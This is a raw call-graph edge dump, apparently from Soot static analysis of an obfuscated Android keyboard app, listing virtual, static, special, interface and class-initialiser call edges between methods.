VIRTUAL edge: $i1 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lta: int hashCode()> ==> <lta: int hashCode()>
SPECIAL edge: specialinvoke $r0.<ltr: void <init>()>() in <ltr: void <clinit>()> ==> <ltr: void <init>()>
STATIC edge: staticinvoke <izw: void an(java.lang.Object,int,int)>($r1, $i3, $i6) in <ljd: int z(int,int,int,int)> ==> <izw: void an(java.lang.Object,int,int)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r3) in <lma: lma i(int,java.lang.Object[])> ==> <java.util.AbstractSet: boolean equals(java.lang.Object)>
VIRTUAL edge: virtualinvoke r0.<ljd: void u(int,java.lang.Object)>($i0, $r2) in <ljd: void r(int,java.lang.Object,java.lang.Object,int,int)> ==> <ljd: void u(int,java.lang.Object)>
VIRTUAL edge: virtualinvoke r0.<ljd: void p()>() in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <ljd: void p()>
VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <lrg: int hashCode()>
STATIC edge: $r0 = staticinvoke <lth: lth i(java.lang.String)>("EntryStoreHelper") in <hnc: void <clinit>()> ==> <lth: lth i(java.lang.String)>
SPECIAL edge: specialinvoke r0.<lsb: void <init>(int,int)>($i1, $i0) in <lkm: void <init>(lkq,int)> ==> <lsb: void <init>(int,int)>
STATIC edge: $r1 = staticinvoke <luk: lum a(java.lang.String[])>($r0) in <luk: void <clinit>()> ==> <luk: lum a(java.lang.String[])>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r0) in <kzs: boolean d(java.lang.Object,java.lang.Object)> ==> <java.lang.String: boolean equals(java.lang.Object)>
STATIC edge: staticinvoke <izw: void aq(java.lang.Object,java.lang.Object)>($r2, $r3) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <izw: void aq(java.lang.Object,java.lang.Object)>
STATIC edge: staticinvoke <iye: void I(boolean,java.lang.Object)>($z0, "Arrays already allocated") in <ljd: int b()> ==> <iye: void I(boolean,java.lang.Object)>
STATIC edge: $r2 = staticinvoke <java.lang.Integer: java.lang.Integer valueOf(int)>($i1) in <iye: java.lang.String X(int,int,java.lang.String)> ==> <java.lang.Integer: java.lang.Integer valueOf(int)>
STATIC edge: $i6 = staticinvoke <izw: int ac(int)>($i6) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <izw: int ac(int)>
SPECIAL edge: specialinvoke $r8.<java.lang.NullPointerException: void <init>(java.lang.String)>("Null throw statement replaced by Soot") in <lvr: void <init>(java.util.List)> ==> <java.lang.NullPointerException: void <init>(java.lang.String)>
STATIC edge: $r2 = staticinvoke <lvm: lum j()>() in <luk: lum a(java.lang.String[])> ==> <lvm: lum j()>
STATIC edge: $i3 = staticinvoke <izw: int af(int,int)>($i2, $i0) in <ljf: int o(int,int,int,int)> ==> <izw: int af(int,int)>
STATIC edge: $r4 = staticinvoke <android.net.Uri: android.net.Uri parse(java.lang.String)>($r1) in <hcb: void <init>()> ==> <android.net.Uri: android.net.Uri parse(java.lang.String)>
VIRTUAL edge: $i0 = virtualinvoke $r1.<ljf: int c()>() in <lje: void <init>(ljf)> ==> <ljf: int c()>
STATIC edge: $r2 = staticinvoke <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>($r2, $i0) in <ljf: void l(int)> ==> <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>
INTERFACE edge: $r7 = interfaceinvoke $r10.<java.util.Collection: java.util.Iterator iterator()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <ljf: java.util.Iterator iterator()>
INTERFACE edge: $r8 = interfaceinvoke $r6.<java.util.Iterator: java.lang.Object next()>() in <lqs: boolean equals(java.lang.Object)> ==> <lsb: java.lang.Object next()>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object get(java.lang.Object)> ==> <lsp: int hashCode()>
CLINIT edge: staticinvoke <lkq: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lkq: void <clinit>()>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r1) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.lang.String: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Integer: int numberOfLeadingZeros(int)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r9.<j$.util.concurrent.r: void <init>(j$.util.concurrent.s)>($r7) in <j$.util.concurrent.ConcurrentHashMap: void p(j$.util.concurrent.l[],int)> ==> <j$.util.concurrent.r: void <init>(j$.util.concurrent.s)>
INTERFACE edge: $r7 = interfaceinvoke $r10.<java.util.Collection: java.util.Iterator iterator()>() in <lmb: lme f()> ==> <lqr: java.util.Iterator iterator()>
VIRTUAL edge: $r1 = virtualinvoke r0.<lqr: lsa l()>() in <lqr: java.util.Iterator iterator()> ==> <lqr: lsa l()>
STATIC edge: $z0 = staticinvoke <iwt: boolean o(char)>($c0) in <ivw: boolean O(char)> ==> <iwt: boolean o(char)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <lkq: boolean equals(java.lang.Object)>
VIRTUAL edge: $i0 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lid: int hashCode()> ==> <lkq: int hashCode()>
VIRTUAL edge: $r3 = virtualinvoke $r1.<j$.util.concurrent.q: j$.util.concurrent.l c()>() in <j$.util.concurrent.ConcurrentHashMap: int hashCode()> ==> <j$.util.concurrent.q: j$.util.concurrent.l c()>
STATIC edge: $i0 = staticinvoke <izw: int af(int,int)>($i0, $i1) in <ljd: int f(java.lang.Object)> ==> <izw: int af(int,int)>
SPECIAL edge: specialinvoke r0.<ljf: void q(int)>($i1) in <ljf: int b()> ==> <ljf: void q(int)>
SPECIAL edge: specialinvoke $r23.<jhe: void <init>(lak,lsr,int,byte[])>($r10, $r1, 20, null) in <lsd: boolean b(lsr)> ==> <jhe: void <init>(lak,lsr,int,byte[])>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(char)>(45) in <ivv: java.lang.String c()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(char)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r6) in <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)> ==> <java.lang.Object: boolean equals(java.lang.Object)>
VIRTUAL edge: virtualinvoke $r5.<java.util.concurrent.atomic.AtomicLong: void set(long)>($l0) in <j$.util.concurrent.ThreadLocalRandom: void <clinit>()> ==> <java.util.concurrent.atomic.AtomicLong: void set(long)>
INTERFACE edge: $r3 = interfaceinvoke $r7.<java.util.Iterator: java.lang.Object next()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <liz: java.lang.Object next()>
SPECIAL edge: specialinvoke $r10.<java.lang.StringBuilder: void <init>()>() in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: void <init>()>
INTERFACE edge: $r6 = interfaceinvoke $r4.<java.util.Set: java.util.Iterator iterator()>() in <lqs: boolean equals(java.lang.Object)> ==> <liy: java.util.Iterator iterator()>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.String: int indexOf(int)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
STATIC edge: staticinvoke <ojg: void c(java.lang.Object,java.lang.String)>($r3, "copyOf(this, newSize)") in <qj: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <ojg: void c(java.lang.Object,java.lang.String)>
SPECIAL edge: specialinvoke $r0.<java.lang.NullPointerException: void <init>(java.lang.String)>($r2) in <ojg: void v(java.lang.String)> ==> <java.lang.NullPointerException: void <init>(java.lang.String)>
VIRTUAL edge: $i0 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lid: int hashCode()> ==> <java.util.AbstractMap$SimpleImmutableEntry: int hashCode()>
VIRTUAL edge: $r4 = virtualinvoke $r2.<ivw: java.lang.String p()>() in <ivw: boolean equals(java.lang.Object)> ==> <ivw: java.lang.String p()>
VIRTUAL edge: $i0 = virtualinvoke r0.<ljf: int d(int)>($i0) in <ljf: java.util.Set f()> ==> <ljf: int d(int)>
INTERFACE edge: $r2 = interfaceinvoke $r1.<java.util.Iterator: java.lang.Object next()>() in <izw: boolean D(java.util.Collection,java.util.Iterator)> ==> <liz: java.lang.Object next()>
VIRTUAL edge: $i1 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lta: int hashCode()> ==> <java.lang.Object: int hashCode()>
STATIC edge: $r1 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r1) in <lql: java.lang.Object get(int)> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
SPECIAL edge: specialinvoke $r1.<lqr: void <init>(java.lang.Object[],int,java.lang.Object[],int,int)>($r0, 0, $r0, 0, 0) in <lqr: void <clinit>()> ==> <lqr: void <init>(java.lang.Object[],int,java.lang.Object[],int,int)>
VIRTUAL edge: $r2 = virtualinvoke $r1.<lkq: java.lang.Object get(int)>($i0) in <lkm: java.lang.Object a(int)> ==> <lqp: java.lang.Object get(int)>
CLINIT edge: staticinvoke <mag: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <mag: void <clinit>()>
VIRTUAL edge: $z0 = virtualinvoke $r3.<lvr: boolean equals(java.lang.Object)>($r4) in <lvt: boolean equals(java.lang.Object)> ==> <java.util.AbstractMap: boolean equals(java.lang.Object)>
VIRTUAL edge: virtualinvoke $r2.<ivv: void f(java.lang.String)>($r6) in <ivw: ivw d(java.util.Locale)> ==> <ivv: void f(java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke r0.<lma: boolean d()>() in <lma: boolean equals(java.lang.Object)> ==> <lqr: boolean d()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <java.lang.Throwable: void <init>()> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: $i0 = virtualinvoke $r19.<java.util.concurrent.atomic.AtomicInteger: int getAndSet(int)>(0) in <lsd: boolean b(lsr)> ==> <java.util.concurrent.atomic.AtomicInteger: int getAndSet(int)>
VIRTUAL edge: $r2 = virtualinvoke r0.<ljd: java.lang.Object h(int)>($i2) in <ljd: int f(java.lang.Object)> ==> <ljd: java.lang.Object h(int)>
VIRTUAL edge: virtualinvoke $r0.<java.lang.StringBuilder: java.lang.StringBuilder append(int)>($i0) in <izw: java.lang.Object al(int)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(int)>
VIRTUAL edge: $r7 = virtualinvoke $r4.<nzh: java.lang.String c()>() in <ivv: ivw b(java.lang.String)> ==> <nzh: java.lang.String c()>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r1) in <j$.util.concurrent.k: boolean equals(java.lang.Object)> ==> <lsp: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke r6.<lqr: void <init>(java.lang.Object[],int,java.lang.Object[],int,int)>($r2, $i0, $r1, $i1, $i2) in <lly: lma g()> ==> <lqr: void <init>(java.lang.Object[],int,java.lang.Object[],int,int)>
VIRTUAL edge: $z0 = virtualinvoke $r6.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)> ==> <lta: boolean equals(java.lang.Object)>
INTERFACE edge: $i0 = interfaceinvoke $r10.<java.util.Collection: int size()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <liy: int size()>
VIRTUAL edge: $r10 = virtualinvoke $r9.<lma: lsa l()>() in <hbv: void j()> ==> <lqs: lsa l()>
VIRTUAL edge: virtualinvoke $r0.<java.lang.Throwable: void setStackTrace(java.lang.StackTraceElement[])>($r2) in <ojg: void g(java.lang.Throwable,java.lang.String)> ==> <java.lang.Throwable: void setStackTrace(java.lang.StackTraceElement[])>
SPECIAL edge: specialinvoke $r0.<lak: void <init>(byte[])>(null) in <lsu: void <clinit>()> ==> <lak: void <init>(byte[])>
STATIC edge: staticinvoke <idq: idq a(java.lang.String,mag)>("Uncategorized", $r0) in <idq: void <clinit>()> ==> <idq: idq a(java.lang.String,mag)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <ing: void <init>(java.lang.String,iec)> ==> <java.lang.Object: void <init>()>
STATIC edge: $r11 = staticinvoke <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l m(j$.util.concurrent.l[],int)>($r5, $i2) in <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])> ==> <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l m(j$.util.concurrent.l[],int)>
VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <lqr: int hashCode()>
STATIC edge: staticinvoke <izw: void aq(java.lang.Object,java.lang.Object)>($r7, $r8) in <lkx: lkx o(java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object)> ==> <izw: void aq(java.lang.Object,java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lta: boolean equals(java.lang.Object)> ==> <java.lang.Object: boolean equals(java.lang.Object)>
INTERFACE edge: $z0 = interfaceinvoke $r10.<java.util.Iterator: boolean hasNext()>() in <hbv: void j()> ==> <lnc: boolean hasNext()>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.lang.String: int hashCode()>
INTERFACE edge: $r8 = interfaceinvoke $r9.<lse: lsw j(java.lang.String,java.lang.String,int,java.lang.String)>("com/google/android/libraries/inputmethod/utils/LanguageTag", "extractLanguageAndCountryFromLocale", 253, "LanguageTag.java") in <ivw: ivw d(java.util.Locale)> ==> <lsv: lsw j(java.lang.String,java.lang.String,int,java.lang.String)>
SPECIAL edge: specialinvoke $r1.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.RuntimeException: void <init>()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
STATIC edge: $z0 = staticinvoke <ivw: boolean u(char)>($c4) in <ivv: ivw b(java.lang.String)> ==> <ivw: boolean u(char)>
STATIC edge: $i1 = staticinvoke <java.lang.Integer: int highestOneBit(int)>($i0) in <izw: java.lang.Object al(int)> ==> <java.lang.Integer: int highestOneBit(int)>
STATIC edge: $z0 = staticinvoke <android.text.TextUtils: boolean isEmpty(java.lang.CharSequence)>($r4) in <ivw: ivw d(java.util.Locale)> ==> <android.text.TextUtils: boolean isEmpty(java.lang.CharSequence)>
VIRTUAL edge: $i6 = virtualinvoke $r3.<java.lang.Object: int hashCode()>() in <lma: lma i(int,java.lang.Object[])> ==> <lid: int hashCode()>
VIRTUAL edge: virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("] was already created.") in <hbv: void k(java.lang.Object,boolean)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke $r3.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("Multiple entries with same key: ") in <mly: java.lang.IllegalArgumentException f()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r0.<lmb: void <init>()>() in <lme: lmb g()> ==> <lmb: void <init>()>
STATIC edge: $r3 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r3) in <ivw: ivw d(java.util.Locale)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
SPECIAL edge: specialinvoke r0.<iec: void <init>()>() in <hnp: void <init>()> ==> <iec: void <init>()>
VIRTUAL edge: $r3 = virtualinvoke $r6.<java.lang.String: java.lang.String concat(java.lang.String)>($r3) in <ivw: ivw d(java.util.Locale)> ==> <java.lang.String: java.lang.String concat(java.lang.String)>
VIRTUAL edge: $i0 = virtualinvoke r0.<lma: int hashCode()>() in <lma: boolean equals(java.lang.Object)> ==> <lqr: int hashCode()>
SPECIAL edge: specialinvoke $r6.<mag: void <init>(java.lang.String,int,int)>("TENOR_GIF_TRENDING_METADATA", 6, 6) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Throwable: java.lang.StackTraceElement[] getStackTrace()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r2.<lvs: void <init>(java.lang.String,int)>("LONG", 2) in <lvs: void <clinit>()> ==> <lvs: void <init>(java.lang.String,int)>
INTERFACE edge: $r3 = interfaceinvoke $r1.<java.util.Map$Entry: java.lang.Object getValue()>() in <lli: void c(java.util.Map$Entry)> ==> <lki: java.lang.Object getValue()>
STATIC edge: staticinvoke <j$.util.concurrent.ConcurrentHashMap: void j(j$.util.concurrent.l[],int,j$.util.concurrent.l)>($r4, $i0, $r9) in <j$.util.concurrent.ConcurrentHashMap: void p(j$.util.concurrent.l[],int)> ==> <j$.util.concurrent.ConcurrentHashMap: void j(j$.util.concurrent.l[],int,j$.util.concurrent.l)>
SPECIAL edge: specialinvoke $r5.<lqk: void <init>(java.lang.Object[],int)>($r6, 3) in <ivw: void <clinit>()> ==> <lqk: void <init>(java.lang.Object[],int)>
INTERFACE edge: $z0 = interfaceinvoke $r7.<java.util.Iterator: boolean hasNext()>() in <lqs: boolean equals(java.lang.Object)> ==> <lsb: boolean hasNext()>
VIRTUAL edge: $z0 = virtualinvoke r0.<lje: boolean hasNext()>() in <lje: java.lang.Object next()> ==> <lje: boolean hasNext()>
SPECIAL edge: specialinvoke $r30.<hfd: void <init>(axu,java.lang.Class,ldp)>($r20, class "Ljava/io/InputStream;", r0) in <hbw: java.lang.Object a(java.lang.Object)> ==> <hfd: void <init>(axu,java.lang.Class,ldp)>
VIRTUAL edge: $r1 = virtualinvoke $r2.<lkq: lsb B()>() in <lqs: lsa l()> ==> <lkq: lsb B()>
STATIC edge: $i1 = staticinvoke <lkg: int a(int,int)>($i0, $i1) in <lkg: void g(int)> ==> <lkg: int a(int,int)>
STATIC edge: $i0 = staticinvoke <izw: int ad(java.lang.Object)>($r1) in <ljd: int f(java.lang.Object)> ==> <izw: int ad(java.lang.Object)>
STATIC edge: $l0 = staticinvoke <j$.util.concurrent.ThreadLocalRandom: long e(long)>($l0) in <j$.util.concurrent.ThreadLocalRandom: void <clinit>()> ==> <j$.util.concurrent.ThreadLocalRandom: long e(long)>
VIRTUAL edge: virtualinvoke $r3.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("=") in <mly: java.lang.IllegalArgumentException f()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: $z0 = staticinvoke <ivw: boolean s(java.lang.String)>($r0) in <ivw: boolean z(java.lang.String)> ==> <ivw: boolean s(java.lang.String)>
STATIC edge: $z0 = staticinvoke <ivw: boolean t(char[],int,int)>($r3, $i2, 3) in <ivv: ivw b(java.lang.String)> ==> <ivw: boolean t(char[],int,int)>
VIRTUAL edge: $i1 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lta: int hashCode()> ==> <lsp: int hashCode()>
STATIC edge: $r1 = staticinvoke <idq: idq a(java.lang.String,mag)>("StickerImage", $r0) in <idq: void <clinit>()> ==> <idq: idq a(java.lang.String,mag)>
VIRTUAL edge: virtualinvoke $r9.<java.lang.StringBuilder: java.lang.StringBuilder append(int)>($i0) in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(int)>
STATIC edge: $r9 = staticinvoke <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>($r1, $i2) in <j$.util.concurrent.ConcurrentHashMap: void a(long,int)> ==> <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>
VIRTUAL edge: $z0 = virtualinvoke r0.<lsn: boolean b(lsr)>($r3) in <lsn: boolean ac()> ==> <lsd: boolean b(lsr)>
VIRTUAL edge: $r3 = virtualinvoke $r2.<j$.util.concurrent.ConcurrentHashMap: java.lang.Object putIfAbsent(java.lang.Object,java.lang.Object)>($r0, $r4) in <hcb: hbv v(j$.util.concurrent.ConcurrentHashMap,java.lang.String,java.lang.Object)> ==> <j$.util.concurrent.ConcurrentHashMap: java.lang.Object putIfAbsent(java.lang.Object,java.lang.Object)>
VIRTUAL edge: $i1 = virtualinvoke $r2.<java.lang.String: int length()>() in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.String: int length()>
SPECIAL edge: specialinvoke $r3.<lqq: void <init>(java.lang.Object,java.lang.Object[],int)>($r5, $r0, $i0) in <lqq: lqq r(int,java.lang.Object[],lkt)> ==> <lqq: void <init>(java.lang.Object,java.lang.Object[],int)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <lid: boolean equals(java.lang.Object)>
INTERFACE edge: $r1 = interfaceinvoke $r5.<java.util.Map$Entry: java.lang.Object getKey()>() in <jlu: int compare(java.lang.Object,java.lang.Object)> ==> <java.util.AbstractMap$SimpleImmutableEntry: java.lang.Object getKey()>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lta: boolean equals(java.lang.Object)> ==> <lta: boolean equals(java.lang.Object)>
VIRTUAL edge: $r1 = virtualinvoke $r2.<java.lang.Class: java.lang.String getName()>() in <ojg: void h(java.lang.Throwable)> ==> <java.lang.Class: java.lang.String getName()>
VIRTUAL edge: $z0 = virtualinvoke $r3.<lsz: boolean equals(java.lang.Object)>($r14) in <lsd: boolean b(lsr)> ==> <java.lang.Object: boolean equals(java.lang.Object)>
STATIC edge: $l1 = staticinvoke <j$.util.concurrent.ThreadLocalRandom: long e(long)>($l1) in <j$.util.concurrent.ThreadLocalRandom: void <clinit>()> ==> <j$.util.concurrent.ThreadLocalRandom: long e(long)>
STATIC edge: $r6 = staticinvoke <java.lang.Integer: java.lang.Integer valueOf(int)>($i4) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.lang.Integer: java.lang.Integer valueOf(int)>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r2) in <ojg: void v(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r0.<hbw: void <init>(int)>(3) in <hbw: void <clinit>()> ==> <hbw: void <init>(int)>
STATIC edge: $r22 = staticinvoke <bel: java.io.InputStream a(java.nio.ByteBuffer)>($r21) in <hbw: java.lang.Object a(java.lang.Object)> ==> <bel: java.io.InputStream a(java.nio.ByteBuffer)>
STATIC edge: staticinvoke <lvm: java.lang.Object g(java.lang.Object,java.lang.String)>($r1, "metadata value") in <lsn: void q(lsz,java.lang.Object)> ==> <lvm: java.lang.Object g(java.lang.Object,java.lang.String)>
SPECIAL edge: specialinvoke r0.<lsa: void <init>()>() in <lsb: void <init>(int,int)> ==> <lsa: void <init>()>
VIRTUAL edge: $i1 = virtualinvoke $r0.<java.lang.String: int length()>() in <ivw: boolean B(java.lang.String)> ==> <java.lang.String: int length()>
INTERFACE edge: $r11 = interfaceinvoke $r6.<java.util.Map$Entry: java.lang.Object getKey()>() in <hbv: void j()> ==> <ljb: java.lang.Object getKey()>
SPECIAL edge: $i0 = specialinvoke $r2.<lvr: int b()>() in <lvr: void <init>(lvr,lvr)> ==> <lvr: int b()>
SPECIAL edge: specialinvoke $r6.<java.util.NoSuchElementException: void <init>()>() in <j$.util.concurrent.d: java.lang.Object next()> ==> <java.util.NoSuchElementException: void <init>()>
CLINIT edge: staticinvoke <hnc: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <hnc: void <clinit>()>
VIRTUAL edge: $r2 = virtualinvoke r0.<ljd: java.lang.Object j()>() in <ljd: int f(java.lang.Object)> ==> <ljd: java.lang.Object j()>
SPECIAL edge: specialinvoke r0.<lma: void <init>()>() in <lqn: void <init>(lkx,java.lang.Object[],int,int)> ==> <lma: void <init>()>
STATIC edge: $r1 = staticinvoke <lme: lma l(java.util.Comparator)>(null) in <lme: void <init>(lkx,int)> ==> <lme: lma l(java.util.Comparator)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lid: boolean equals(java.lang.Object)>
VIRTUAL edge: $i6 = virtualinvoke $r3.<java.lang.Object: int hashCode()>() in <lma: lma i(int,java.lang.Object[])> ==> <java.util.AbstractSet: int hashCode()>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r2) in <ivv: java.lang.String c()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r0.<j$.util.concurrent.l: void <init>(int,java.lang.Object,java.lang.Object,j$.util.concurrent.l)>($i0, $r1, $r2, $r3) in <j$.util.concurrent.s: void <init>(int,java.lang.Object,java.lang.Object,j$.util.concurrent.s,j$.util.concurrent.s)> ==> <j$.util.concurrent.l: void <init>(int,java.lang.Object,java.lang.Object,j$.util.concurrent.l)>
STATIC edge: $i3 = staticinvoke <izw: int ad(java.lang.Object)>($r2) in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <izw: int ad(java.lang.Object)>
VIRTUAL edge: $r2 = virtualinvoke $r1.<java.lang.StringBuilder: java.lang.String toString()>() in <ivv: ivw a()> ==> <java.lang.StringBuilder: java.lang.String toString()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lsv: void <init>()> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: $i0 = virtualinvoke $r1.<ljd: int f(java.lang.Object)>($r2) in <ljb: void a()> ==> <ljd: int f(java.lang.Object)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.lang.String: int hashCode()>
STATIC edge: $r1 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r1) in <ljf: java.lang.Object p()> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
VIRTUAL edge: $r4 = virtualinvoke r0.<ljd: int[] w()>() in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <ljd: int[] w()>
VIRTUAL edge: $r12 = virtualinvoke $r3.<lmb: lme f()>() in <hbv: void j()> ==> <lmb: lme f()>
SPECIAL edge: specialinvoke $r0.<coo: void <init>(int)>(9) in <coo: void <clinit>()> ==> <coo: void <init>(int)>
VIRTUAL edge: virtualinvoke r0.<lkh: int b(java.lang.Object[],int)>($r1, 0) in <lkh: java.lang.Object[] toArray(java.lang.Object[])> ==> <lqr: int b(java.lang.Object[],int)>
STATIC edge: $r0 = staticinvoke <iye: java.lang.String r(java.lang.String,java.lang.Object[])>($r0, $r2) in <iye: void D(boolean,java.lang.String,int,int)> ==> <iye: java.lang.String r(java.lang.String,java.lang.Object[])>
VIRTUAL edge: $z1 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <lsp: boolean equals(java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r6) in <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)> ==> <java.lang.Enum: boolean equals(java.lang.Object)>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(" cannot be negative but was: ") in <izw: void as(int,java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lid: void <init>()> ==> <java.lang.Object: void <init>()>
SPECIAL edge: specialinvoke $r2.<idq: void <init>(java.lang.String,mag)>($r0, $r1) in <idq: idq a(java.lang.String,mag)> ==> <idq: void <init>(java.lang.String,mag)>
INTERFACE edge: $r3 = interfaceinvoke $r7.<java.util.Iterator: java.lang.Object next()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <lje: java.lang.Object next()>
VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <lrg: int hashCode()>
